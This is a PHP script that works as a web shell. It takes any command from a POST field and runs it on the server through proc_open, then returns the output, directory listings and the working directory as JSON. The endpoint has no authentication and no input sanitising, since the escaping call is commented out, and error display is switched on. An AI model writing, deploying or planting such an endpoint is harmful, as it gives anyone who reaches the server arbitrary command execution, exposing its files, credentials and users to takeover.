<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$body = [];

$my_exec = function($cmd) use (&$body){
  $data = [];
  exec($cmd, $output2, $result);
  
  $data['result'] = $result;
  $data['cmd1'] = $cmd;
  $data['output'] = $output2;
  $body['out1'] = $output2;
  $body['out2'] = 'ok';
  return $data;
};
  
$my_exec2 = function($command){
  $data = [];
  // $command = 'ls -l';
  $command = preg_replace('/[\/\\\\]+/', '\\', $command);
  
  // Define descriptors for process streams
  $descriptorspec = array(
      0 => array("pipe", "r"),  // stdin
      1 => array("pipe", "w"),  // stdout
      2 => array("pipe", "w")   // stderr
  );
  
  // Open the process
  $process = proc_open($command, $descriptorspec, $pipes);
  
  if (is_resource($process)) {
      // Close stdin as we do not need to send input
      fclose($pipes[0]);
  
      // Read output and error
      $data['output'] = stream_get_contents($pipes[1]);
      fclose($pipes[1]);
      $error = stream_get_contents($pipes[2]);
      fclose($pipes[2]);
  
      // Wait for the process to finish
      $data['result'] = proc_close($process);
  
      // Display output and error
      // echo "Command output:\n$output\n";
      if ($error) {
          $data['error2'] = $error;
      }
      // echo "Return result: $result\n";
  } else {
      $data['error2'] = "Failed to open process.";
  }
  return $data;
};

function get_path($command){
  $pattern = '/ls\s+"(.*?)"\s+>>/';
  $pattern2 = '/ls\s+(.*?)\s+>>/';
  
  // Perform the regular expression match
  if (preg_match($pattern, $command, $matches)) {
      // The path is in the first capture group
      $path = $matches[1];
      return $path;
  } else {
    if(preg_match($pattern2, $command, $matches)){
      $path = $matches[1];
      return $path;
    }else{
      // echo "No path found.\n";
      return 0;
    }
  }
}

// Check if a command is provided
if (isset($_POST['condition'])) {
switch ($_POST['condition']) {
  case 'cmd':
    // $command = escapeshellcmd($_POST['command']);
    // Execute the command and capture the output
    // $output = shell_exec($command);
    
    // $body['command'] = $command;
    // $body['output'] = $output;
    
    $cmd = trim($_POST['command']);
    $body = array_merge($body, $my_exec2($cmd));
    break;
    
  case 'ls':
    $cmd = trim($_POST['command']);
    $body = array_merge($body, $my_exec2(rtrim($cmd, '/')));
    
    if(!$body['result']){
      $array = explode(' ', $cmd, 2);
      if(count($array) !== 1){
        if(is_dir($array[1])){
          $path = $array[1];
        }else{
          $path = get_path("ls ".$array[1]);
          if(!$path){
            $path = './';
          }
        }
      }else{
        $path = './';
      }
      // $path = isset($_POST['path']);
      $path = empty($path) || $path==='.' ? './' : $path;
      $list = array_slice(scandir($path), 2);
      
      $filt = array_map(function ($str) {
        global $path;
        $filePath = $path . DIRECTORY_SEPARATOR . $str;
        return (is_dir($filePath) ? 'dir' : 'file');
      }, $list);
    
      $body['output2'] = $list;
      $body['filt2'] = $filt;
      // $body['cmd1'] = '';
    }else{
      $body['error'] = 'Command not found.';
    }
    break;
  
  case 'cwd':
    $body['output'] = getcwd();
    break;
  
  default:
    $body['error'] = 'Not Found! in switch';
    break;
}
} else {
    $body['error'] = 'Not Found in if';
}

echo json_encode($body, JSON_PRETTY_PRINT);

?>
